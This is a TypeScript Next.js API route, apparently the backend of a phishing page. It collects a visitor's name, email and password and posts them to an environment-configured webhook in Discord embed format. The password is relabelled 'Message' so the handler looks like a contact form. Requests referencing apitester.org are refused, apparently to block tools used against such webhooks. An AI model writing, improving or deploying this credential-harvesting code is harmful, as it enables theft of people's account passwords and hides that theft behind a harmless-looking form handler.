import { NextResponse } from "next/server";

let lastRequestTime: number = 0;
const rateLimitInterval: number = 5000;

export async function POST(req: Request) {
  const { firstname, lastname, email, password } = await req.json();

  const currentTime = Date.now();
  if (currentTime - lastRequestTime < rateLimitInterval) {
    return new NextResponse("Ratelimited", { status: 429 });
  }

  const referer = req.headers.get("referer") || "";
  const origin = req.headers.get("origin") || "";
  if (referer.includes("apitester.org") || origin.includes("apitester.org")) {
    return new NextResponse("Forbidden", { status: 403 });
  }
  const userAgent = req.headers.get('user-agent') || '';
    if (userAgent.includes('apitester.org')) {
        return new NextResponse("Forbidden", { status: 403 });
    }

  try {
    const content = `**Firstname:** ${firstname} | **Lastname:** ${lastname} | **Email:** ${email} | **Message:** ${password}`;

    const webhookUrl = process.env.WEBHOOK_URL;
    if (!webhookUrl) {
      throw new Error("WEBHOOK_URL is not defined in the environment variables.");
    }

    await fetch(
      webhookUrl,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: email,
          embeds: [
            {
              title: "New message from " + firstname + " " + lastname,
              color: 3447003,
              fields: [
                {
                  name: "Email",
                  value: email,
                  inline: true,
                },
                {
                  name: "Message",
                  value: password,
                  inline: true,
                },
              ],
              timeStamp: new Date(),
            },
          ],
        }),
      }
    );

    lastRequestTime = currentTime;

    return new NextResponse("Succesfully sent message", { status: 200 });
  } catch (error: any) {
    console.log(error);

    return new NextResponse("Internal Server error", { status: 500 });
  }
}
